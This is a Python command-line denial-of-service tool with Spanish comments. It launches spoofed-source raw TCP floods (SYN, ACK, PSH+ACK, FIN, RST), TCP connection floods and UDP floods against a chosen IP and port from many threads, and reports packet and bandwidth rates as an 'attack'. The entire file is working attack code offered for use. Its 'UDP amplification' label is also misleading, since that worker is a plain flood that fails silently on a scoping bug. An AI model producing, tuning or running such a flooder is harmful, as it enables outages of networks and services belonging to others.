#!/usr/bin/env python3
import socket, random, time, struct, sys, threading, os, ctypes, array

def checksum(data):
    if len(data) % 2: data += b'\x00'
    s = sum(array.array('H', data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ctypes.c_ushort(~s).value

def tcp_mix_max_power(target_ip, target_port, duration):
    end_time = time.time() + duration
    sent_packets = 0
    sent_bytes = 0
    
    def raw_worker():
        nonlocal sent_packets, sent_bytes
        while time.time() < end_time:
            try:
                # Socket RAW para máximo control
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # IP de origen aleatorio
                src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
                
                # Seleccionar tipo de paquete TCP aleatorio
                packet_type = random.randint(0, 4)
                
                # 1. SYN Flood (30%)
                if packet_type == 0:
                    flags = 0x02  # SYN
                    data = b''
                
                # 2. ACK Flood con datos (30%)
                elif packet_type == 1:
                    flags = 0x10  # ACK
                    data = os.urandom(random.randint(64, 1400))
                
                # 3. PSH+ACK Flood con datos grandes (20%)
                elif packet_type == 2:
                    flags = 0x18  # PSH+ACK
                    data = os.urandom(random.randint(500, 1400))
                
                # 4. FIN Flood (10%)
                elif packet_type == 3:
                    flags = 0x01  # FIN
                    data = b''
                
                # 5. RST Flood (10%)
                else:
                    flags = 0x04  # RST
                    data = b''
                
                # Cabecera IP
                ip_ihl_ver = (4 << 4) + 5
                ip_tot_len = 20 + 20 + len(data)
                ip_id = random.randint(0, 65535)
                ip_frag_off = 0x4000  # Don't fragment
                ip_ttl = random.choice([64, 128, 255])
                ip_proto = 6
                ip_check = 0
                ip_saddr = socket.inet_aton(src_ip)
                ip_daddr = socket.inet_aton(target_ip)
                
                ip_header = struct.pack('!BBHHHBBH4s4s',
                    ip_ihl_ver, 0, ip_tot_len, ip_id,
                    ip_frag_off, ip_ttl, ip_proto, ip_check,
                    ip_saddr, ip_daddr
                )
                
                # Cabecera TCP
                src_port = random.randint(1024, 65535)
                seq_num = random.randint(0, 4294967295)
                ack_num = random.randint(0, 4294967295) if flags & 0x10 else 0
                data_offset = (5 << 4)  # 20 bytes de cabecera TCP
                window = random.randint(1024, 65535)
                tcp_check = 0
                urg_ptr = 0
                
                tcp_header = struct.pack('!HHLLBBHHH',
                    src_port, target_port, seq_num,
                    ack_num, data_offset, flags,
                    window, tcp_check, urg_ptr
                )
                
                # Pseudo-cabecera para checksum TCP
                pseudo = struct.pack('!4s4sBBH',
                    ip_saddr, ip_daddr, 0, 6, len(tcp_header) + len(data)
                )
                
                tcp_check = checksum(pseudo + tcp_header + data)
                tcp_header = struct.pack('!HHLLBBHHH',
                    src_port, target_port, seq_num,
                    ack_num, data_offset, flags,
                    window, tcp_check, urg_ptr
                )
                
                # Paquete completo
                packet = ip_header + tcp_header + data
                
                # Enviar ráfaga de paquetes
                for _ in range(random.randint(1, 10)):
                    sock.sendto(packet, (target_ip, 0))
                    sent_packets += 1
                    sent_bytes += len(packet)
                
                sock.close()
                
                # Sin sleep para máximo rendimiento
                
            except:
                continue
    
    def socket_worker():
        nonlocal sent_packets, sent_bytes
        while time.time() < end_time:
            try:
                # Socket normal para conexiones establecidas
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.settimeout(0.1)
                
                try:
                    sock.connect((target_ip, target_port))
                    
                    # Enviar datos continuamente
                    data = os.urandom(1400)
                    while time.time() < end_time:
                        try:
                            sent = sock.send(data)
                            if sent > 0:
                                sent_packets += 1
                                sent_bytes += sent
                        except:
                            break
                            
                except:
                    pass
                
                sock.close()
                
            except:
                continue
    
    def udp_amplification():
        """Amplificación UDP para mayor ancho de banda"""
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0)
                
                # Datos grandes para consumo de ancho de banda
                data = os.urandom(1024)
                
                for _ in range(50):
                    sock.sendto(data, (target_ip, target_port))
                    sent_packets += 1
                    sent_bytes += len(data)
                
                sock.close()
                
            except:
                continue
    
    # Lanzar threads optimizados
    threads = []
    
    # Threads RAW (más eficientes)
    for _ in range(os.cpu_count() * 4):
        t = threading.Thread(target=raw_worker, daemon=True)
        t.start()
        threads.append(t)
    
    # Threads socket (para conexiones establecidas)
    for _ in range(os.cpu_count() * 2):
        t = threading.Thread(target=socket_worker, daemon=True)
        t.start()
        threads.append(t)
    
    # Threads UDP para amplificación
    for _ in range(os.cpu_count()):
        t = threading.Thread(target=udp_amplification, daemon=True)
        t.start()
        threads.append(t)
    
    # Monitor de estadísticas
    def stats_monitor():
        last_time = time.time()
        last_packets = 0
        last_bytes = 0
        
        while time.time() < end_time:
            time.sleep(1)
            
            current_time = time.time()
            elapsed = current_time - last_time
            
            current_packets = sent_packets
            current_bytes = sent_bytes
            
            pps = (current_packets - last_packets) / elapsed
            mbps = ((current_bytes - last_bytes) * 8) / (elapsed * 1_000_000)
            
            sys.stdout.write(f"\r[+] PPS: {pps:,.0f} | MBit/s: {mbps:.2f} | Total: {current_packets:,} pkts")
            sys.stdout.flush()
            
            last_time = current_time
            last_packets = current_packets
            last_bytes = current_bytes
    
    # Iniciar monitor
    monitor = threading.Thread(target=stats_monitor, daemon=True)
    monitor.start()
    
    # Esperar duración
    time.sleep(duration)
    
    # Estadísticas finales
    total_time = duration
    avg_pps = sent_packets / total_time if total_time > 0 else 0
    avg_mbps = (sent_bytes * 8) / (total_time * 1_000_000) if total_time > 0 else 0
    
    print(f"\n\n[+] Ataque finalizado")
    print(f"[+] Paquetes totales: {sent_packets:,}")
    print(f"[+] Bytes totales: {sent_bytes:,}")
    print(f"[+] PPS promedio: {avg_pps:,.0f}")
    print(f"[+] Ancho de banda: {avg_mbps:.2f} Mbps")

if __name__ == "__main__":
    if len(sys.argv) == 4:
        tcp_mix_max_power(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
